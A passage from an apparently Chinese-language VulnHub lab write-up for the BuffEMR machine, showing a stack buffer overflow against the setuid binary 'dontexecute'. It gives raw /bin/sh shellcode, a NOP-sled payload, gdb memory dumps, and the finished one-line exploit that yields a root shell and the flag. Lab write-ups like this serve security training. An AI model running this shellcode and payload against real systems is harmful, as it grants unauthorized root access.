class="string">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string">gef➤  </span></span><br></pre></td></tr></table></figure>
<p>结合 3.2.2 的图对比 <code>$ebp</code> 和 <code>$eip</code>
的值，可见我们可以控制 EIP 及其之前缓冲区的数据</p>
<p>检查程序的保护机制，NX 被禁用了，但 PIE 保护是启用的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  checksec </span><br><span class="line">[+] checksec <span class="keyword">for</span> <span class="string">&#x27;/root/Desktop/dontexecute&#x27;</span></span><br><span class="line">Canary                        : ✘ </span><br><span class="line">NX                            : ✘ </span><br><span class="line">PIE                           : ✓ </span><br><span class="line">Fortify                       : ✘ </span><br><span class="line">RelRO                         : Full</span><br><span class="line">gef➤ </span><br></pre></td></tr></table></figure>
<p>程序开启了PIE保护机制，但是该保护机制只有在程序开启ASLR保护才有效，因此我们验证一下靶机的ASLR机制是否开启：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buffemr@buffemr:/opt$ <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space </span><br><span class="line">0</span><br><span class="line">buffemr@buffemr:/opt$ </span><br></pre></td></tr></table></figure>
<p>靶机系统没有开启ASLR机制，这使得程序每次运行栈都加载到内存的固定地址处</p>
<p>由于程序中只有一个输入点且用户数据输入到栈上，因此我们考虑向栈上注入
Shellcode，此时需要泄露栈地址</p>
<p>即我们在 512 字节区填充上 NOP 指令和 Shellcode，而后再让
<code>$eip</code> 指向 NOP
指令地址便可，为便利后续测试返回地址只覆盖了EIP【这和 3.2.2
的图稍微有点区别】</p>
<p>前面 Shellcode 共 53 字节</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># python -c &#x27;print(len(&quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;))&#x27;</span></span><br><span class="line">53</span><br></pre></td></tr></table></figure>
<p>所需填充的 NOP 指令数 =512-53=459</p>
<p>靶机测试，【注，<code>0x90</code> 即对应的 <code>NOPS</code> 】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">buffemr@buffemr:/opt$ gdb -q ./dontexecute</span><br><span class="line">Reading symbols from ./dontexecute...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) r $(python -c <span class="string">&#x27;print &quot;\x90&quot;*459 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;B&quot;*4&#x27;</span>)</span><br><span class="line">Starting program: /opt/dontexecute $(python -c <span class="string">&#x27;print &quot;\x90&quot;*459 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;B&quot;*4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
<p><code>x/300wx $esp</code> : 从 <code>$esp</code>
指向的内存地址开始，查看接下来的 300 个 word（每个 word 4
字节）内容。</p>
<ul>
<li><strong>x/</strong>：这是
<code>x</code>（examine）命令，用于查看内存内容。</li>
<li><strong>300</strong>：这是一个参数，指定要查看的字节数。在这个上下文中，表示要显示
300 个单元的内容。</li>
<li><strong>w</strong>：表示“word”。在 x86 架构中，word 通常是 4
字节。因此，<code>w</code> 表示每个单元为 4 字节。</li>
<li><strong>x</strong>：第二个 <code>x</code>
表示以十六进制格式显示内存内容。</li>
<li><strong>$esp</strong>：这是一个寄存器，表示当前栈指针（Extended
Stack Pointer），指向栈的顶部。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/300wx <span class="variable">$esp</span></span><br><span class="line">0xffffd360:     0xffffd500      0xffffd424      0xffffd430      0x565556e2</span><br><span class="line">0xffffd370:     0xffffd390      0x00000000      0x00000000      0xf7c74fa1</span><br><span class="line">0xffffd380:     0xf7e31000      0xf7e31000      0x00000000      0xf7c74fa1</span><br><span class="line">0xffffd390:     0x00000002      0xffffd424      0xffffd430      0xffffd3b4</span><br><span class="line">0xffffd3a0:     0x00000002      0xffffd424      0xf7e31000      0xf7fe570a</span><br><span class="line">0xffffd3b0:     0xffffd420      0x00000000      0xf7e31000      0x00000000</span><br><span class="line">0xffffd3c0:     0x00000000      0x82bf22c9      0xf386c4d9      0x00000000</span><br><span class="line">0xffffd3d0:     0x00000000      0x00000000      0x00000040      0xf7ffd024</span><br><span class="line">0xffffd3e0:     0x00000000      0x00000000      0xf7fe5819      0x56556fc4</span><br><span class="line">0xffffd3f0:     0x00000002      0x56555560      0x00000000      0x56555591</span><br><span class="line">0xffffd400:     0x565556ce      0x00000002      0xffffd424      0x565557c0</span><br><span class="line">0xffffd410:     0x56555820      0xf7fe5960      0xffffd41c      0xf7ffd940</span><br><span class="line">0xffffd420:     0x00000002      0xffffd564      0xffffd575      0x00000000</span><br><span class="line">0xffffd430:     0xffffd77a      0xffffdd66      0xffffdd9a      0xffffddbc</span><br><span class="line">0xffffd440:     0xffffddcb      0xffffdddc      0xffffddf1      0xffffde03</span><br><span class="line">0xffffd450:     0xffffde10      0xffffde19      0xffffde22      0xffffde35</span><br><span class="line">0xffffd460:     0xffffde57      0xffffde98      0xffffdeab      0xffffdeb7</span><br><span class="line">0xffffd470:     0xffffdece      0xffffdede      0xffffdef2      0xffffdefa</span><br><span class="line">0xffffd480:     0xffffdf0a      0xffffdf40      0xffffdf5f      0xffffdfc7</span><br><span class="line">0xffffd490:     0x00000000      0x00000020      0xf7fd5b50      0x00000021</span><br><span class="line">0xffffd4a0:     0xf7fd5000      0x00000010      0x0f8bfbff      0x00000006</span><br><span class="line">0xffffd4b0:     0x00001000      0x00000011      0x00000064      0x00000003</span><br><span class="line">0xffffd4c0:     0x56555034      0x00000004      0x00000020      0x00000005</span><br><span class="line">0xffffd4d0:     0x00000009      0x00000007      0xf7fd6000      0x00000008</span><br><span class="line">0xffffd4e0:     0x00000000      0x00000009      0x56555560      0x0000000b</span><br><span class="line">0xffffd4f0:     0x000003e8      0x0000000c      0x000003e8      0x0000000d</span><br><span class="line">0xffffd500:     0x000003e8      0x0000000e      0x000003e8      0x00000017</span><br><span class="line">0xffffd510:     0x00000001      0x00000019      0xffffd54b      0x0000001a</span><br><span class="line">0xffffd520:     0x00000000      0x0000001f      0xffffdfe7      0x0000000f</span><br><span class="line">0xffffd530:     0xffffd55b      0x00000000      0x00000000      0x00000000</span><br><span class="line">0xffffd540:     0x00000000      0x00000000      0x8d000000      0x0114ccbb</span><br><span class="line">0xffffd550:     0x649b3e8c      0xab2fdf20      0x698351a1      0x00363836</span><br><span class="line">0xffffd560:     0x00000000      0x74706f2f      0x6e6f642f      0x65786574</span><br><span class="line">0xffffd570:     0x65747563      0x90909000      0x90909090      0x90909090</span><br><span class="line">0xffffd580:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd590:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd5a0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd5b0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd5c0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd5d0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd5e0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd5f0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd600:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd610:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd620:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd630:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd640:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd650:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd660:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">0xffffd670:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd680:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd690:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd6a0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd6b0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd6c0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd6d0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd6e0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd6f0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd700:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd710:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd720:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd730:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xffffd740:     0xdb31c031      0x80cd17b0      0x895e1feb      0xc0310876</span><br><span class="line">0xffffd750:     0x89074688      0x0bb00c46      0x4e8df389      0x0c568d08</span><br><span class="line">0xffffd760:     0xdb3180cd      0xcd40d889      0xffdce880      0x622fffff</span><br><span class="line">0xffffd770:     0x732f6e69      0x42424268      0x534c0042      0x4c4f435f</span><br><span class="line">0xffffd780:     0x3d53524f      0x303d7372      0x3d69643a      0x333b3130</span><br><span class="line">0xffffd790:     0x6e6c3a34      0x3b31303d      0x6d3a3633      0x30303d68</span><br><span class="line">0xffffd7a0:     0x3d69703a      0x333b3034      0x6f733a33      0x3b31303d</span><br><span class="line">0xffffd7b0:     0x643a3533      0x31303d6f      0x3a35333b      0x343d6462</span><br><span class="line">0xffffd7c0:     0x33333b30      0x3a31303b      0x343d6463      0x33333b30</span><br><span class="line">0xffffd7d0:     0x3a31303b      0x343d726f      0x31333b30      0x3a31303b</span><br><span class="line">0xffffd7e0:     0x303d696d      0x75733a30      0x3b37333d      0x733a3134</span><br><span class="line">0xffffd7f0:     0x30333d67      0x3a33343b      0x333d6163      0x31343b30</span><br><span class="line">0xffffd800:     0x3d77743a      0x343b3033      0x776f3a32      0x3b34333d</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>可见 Shellcode 开始位置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0xffffd740:     0xdb31c031      0x80cd17b0      0x895e1feb      0xc0310876</span><br><span class="line">0xffffd750:     0x89074688      0x0bb00c46      0x4e8df389      0x0c568d08</span><br><span class="line">0xffffd760:     0xdb3180cd      0xcd40d889      0xffdce880      0x622fffff</span><br><span class="line">0xffffd770:     0x732f6e69      0x42424268      0x534c0042      0x4c4f435f</span><br><span class="line">0xffffd780:     0x3d53524f      0x303d7372      0x3d69643a      0x333b3130</span><br><span class="line">0xffffd790:     0x6e6c3a34      0x3b31303d      0x6d3a3633      0x30303d68</span><br><span class="line">0xffffd7a0:     0x3d69703a      0x333b3034      0x6f733a33      0x3b31303d</span><br><span class="line">0xffffd7b0:     0x643a3533      0x31303d6f      0x3a35333b      0x343d6462</span><br><span class="line">0xffffd7c0:     0x33333b30      0x3a31303b      0x343d6463      0x33333b30</span><br><span class="line">0xffffd7d0:     0x3a31303b      0x343d726f      0x31333b30      0x3a31303b</span><br><span class="line">0xffffd7e0:     0x303d696d      0x75733a30      0x3b37333d      0x733a3134</span><br><span class="line">0xffffd7f0:     0x30333d67      0x3a33343b      0x333d6163      0x31343b30</span><br><span class="line">0xffffd800:     0x3d77743a      0x343b3033      0x776f3a32      0x3b34333d</span><br></pre></td></tr></table></figure>
<p>所以我们可以让 <code>$eip</code> 指向 <code>0xffffd740</code>
地址之前写入 <code>NOP</code> 指令的地址即可</p>
<p>以 <code>0xffffd730</code> 地址为例，由于 x86 处理器是 little endian
字节序，反向写地址</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffd730</span>         \x30\xd7\xff\xff</span><br></pre></td></tr></table></figure>
<p>调试能成功获取到 shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb)  r $(python -c <span class="string">&#x27;print &quot;\x90&quot;*459 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;\x30\xd7\xff\xff&quot;&#x27;</span>)</span><br><span class="line">Starting program: /opt/dontexecute $(python -c <span class="string">&#x27;print &quot;\x90&quot;*459 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;\x30\xd7\xff\xff&quot;&#x27;</span>)</span><br><span class="line">process 19695 is executing new program: /bin/dash</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(buffemr) gid=1000(buffemr) <span class="built_in">groups</span>=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[Inferior 1 (process 19695) exited normally]</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>外部提权成功获得 root 权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">buffemr@buffemr:/opt$ ./dontexecute $(python -c <span class="string">&#x27;print &quot;\x90&quot;*459 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;\x30\xd7\xff\xff&quot;&#x27;</span>)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(buffemr) <span class="built_in">groups</span>=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line">root@buffemr:/opt<span class="comment"># cd ~ </span></span><br><span class="line">root@buffemr:/root<span class="comment"># ls -al</span></span><br><span class="line">total 48</span><br><span class="line">drwx------  7 root root 4096 Sep 22 01:11 .</span><br><span class="line">drwxr-xr-x 26 root root 4096 Sep 22 06:33 ..</span><br><span class="line">-rw-------  1 root root 3665 Sep 22 03:47 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Aug  6  2020 .cache</span><br><span class="line">drwx------  3 root root 4096 Jun 18  2021 .gnupg</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jun 18  2021 .<span class="built_in">local</span></span><br><span class="line">-rw-------  1 root root 1346 Jun 21  2021 .mysql_history</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">drwx------  2 root root 4096 Sep 22 01:12 .ssh</span><br><span class="line">-rw-r--r--  1 root root 4071 Jun 23  2021 Root_flag.txt</span><br><span class="line">drwxr-xr-x  6 root root 4096 Jun 18  2021 snap</span><br><span class="line">root@buffemr:/root<span class="comment"># cat Root_flag.txt </span></span><br><span class="line">                                                                                                                                          </span><br><span class="line">                                                                                                                                            </span><br><span class="line">________                __  __                       ____                                  _____                                        ___ </span><br><span class="line">`MMMMMMMb.             69MM69MM                     6MMMMb                                69M`MM                                        `MM </span><br><span class="line"> MM    `Mb            6M<span class="string">&#x27; 6M&#x27;</span> `                    8P    Y8                              6M<span class="string">&#x27; `MM                                         MM </span></span><br><span class="line"><span class="string"> MM     MM ___   ___ _MM__MM______  ___  __       6M      Mb ____    ___  ____  ___  __ _MM__ MM   _____  ____    _    ___  ____     ____MM </span></span><br><span class="line"><span class="string"> MM    .M9 `MM    MM MMMMMMMM6MMMMb `MM 6MM       MM      MM `MM(    )M&#x27;</span> 6MMMMb `MM 6MM MMMMM MM  6MMMMMb `MM(   ,M.   )M<span class="string">&#x27; 6MMMMb   6MMMMMM </span></span><br><span class="line"><span class="string"> MMMMMMM(   MM    MM  MM  MM6M&#x27;</span>  `Mb MM69 <span class="string">&quot;       MM      MM  `Mb    d&#x27; 6M&#x27;  `Mb MM69 &quot;</span>  MM   MM 6M<span class="string">&#x27;   `Mb `Mb   dMb   d&#x27;</span> 6M<span class="string">&#x27;  `Mb 6M&#x27;</span>  `MM </span><br><span class="line"> MM    `Mb  MM    MM  MM  MMMM    MM MM<span class="string">&#x27;          MM      MM   YM.  ,P  MM    MM MM&#x27;</span>     MM   MM MM     MM  YM. ,PYM. ,P  MM    MM MM    MM </span><br><span class="line"> MM     MM  MM    MM  MM  MMMMMMMMMM MM           MM      MM    MM  M   MMMMMMMM MM      MM   MM MM     MM  `Mb d<span class="string">&#x27;`Mb d&#x27;</span>  MMMMMMMM MM    MM </span><br><span class="line"> MM     MM  MM    MM  MM  MMMM       MM           YM      M9    `Mbd<span class="string">&#x27;   MM       MM      MM   MM MM     MM   YM,P  YM,P   MM       MM    MM </span></span><br><span class="line"><span class="string"> MM    .M9  YM.   MM  MM  MMYM    d9 MM            8b    d8      YMP    YM    d9 MM      MM   MM YM.   ,M9   `MM&#x27;</span>  `MM<span class="string">&#x27;   YM    d9 YM.  ,MM </span></span><br><span class="line"><span class="string">_MMMMMMM9&#x27;</span>   YMMM9MM__MM__MM_YMMMM9 _MM_            YMMMM9        M      YMMMM9 _MM_    _MM_ _MM_ YMMMMM9     YP    YP     YMMMM9   YMMMMMM_</span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">________                                           ___        8   8                                                                         </span><br><span class="line">`MMMMMMMb.                                         `MM       (M) (M)                                                                        </span><br><span class="line"> MM    `Mb                      /                   MM       (M) (M)                                                                        </span><br><span class="line"> MM     MM   _____     _____   /M      ____     ____MM       (M) (M)                                                                        </span><br><span class="line"> MM     MM  6MMMMMb   6MMMMMb /MMMMM  6MMMMb   6MMMMMM        M   M                                                                         </span><br><span class="line"> MM    .M9 6M<span class="string">&#x27;   `Mb 6M&#x27;</span>   `Mb MM    6M<span class="string">&#x27;  `Mb 6M&#x27;</span>  `MM        M   M                                                                         </span><br><span class="line"> MMMMMMM9<span class="string">&#x27; MM     MM MM     MM MM    MM    MM MM    MM        M   M                                                                         </span></span><br><span class="line"><span class="string"> MM  \M\   MM     MM MM     MM MM    MMMMMMMM MM    MM        8   8                                                                         </span></span><br><span class="line"><span class="string"> MM   \M\  MM     MM MM     MM MM    MM       MM    MM                                                                                      </span></span><br><span class="line"><span class="string"> MM    \M\ YM.   ,M9 YM.   ,M9 YM.  ,YM    d9 YM.  ,MM       68b 68b                                                                        </span></span><br><span class="line"><span class="string">_MM_    \M\_YMMMMM9   YMMMMM9   YMMM9 YMMMM9   YMMMMMM_      Y89 Y89  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">COngratulations !!! Tweet me at @san3ncrypt3d ! </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@buffemr:</span></span><br></pre></td></tr></table></figure>
<p>也可按照 3.2.2 图所示重复写入返回地址，不断调整 NOP
指令的填充数来使返回地址恰好覆盖 EIP，示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r $(python -c <span class="string">&#x27;print &quot;\x90&quot;*423 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;\x50\xd6\xff\xff&quot;*50&#x27;</span>)</span><br><span class="line">Starting program: /opt/dontexecute $(python -c <span class="string">&#x27;print &quot;\x90&quot;*423 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;\x50\xd6\xff\xff&quot;*50&#x27;</span>)</span><br><span class="line">process 20326 is executing new program: /bin/dash</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(buffemr) gid=1000(buffemr) <span class="built_in">groups</span>=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[Inferior 1 (process 20326) exited normally]</span><br><span class="line">(gdb) quit</span><br><span class="line">buffemr@buffemr:/opt$ ./dontexecute $(python -c <span class="string">&#x27;print &quot;\x90&quot;*423 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;\x50\xd6\xff\xff&quot;*50&#x27;</span>)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(buffemr) <span class="built_in">groups</span>=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>Shellcode 2 的测试同理</p>
<h2 id="参考">4. 参考</h2>
<ul>
<li><p><a
target="_blank" rel="noopener" href="https://mikerega7.github.io/vh-writeup-buffer/">BufferEMR -
VulnHub - mikerega7.io</a></p></li>
<li><p><a
target="_blank" rel="noopener" href="https://theffth.github.io/2022/12/30/vulnhub-buffemr%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">vulnhub-buffemr渗透复现
| T君的小屋</a></p></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>z9m8r8
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2024/09/23/BuffEMR%201.0.1/" title="BuffEMR: 1.0.1">https://z9m8r8.github.io/2024/09/23/BuffEMR 1.0.1/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
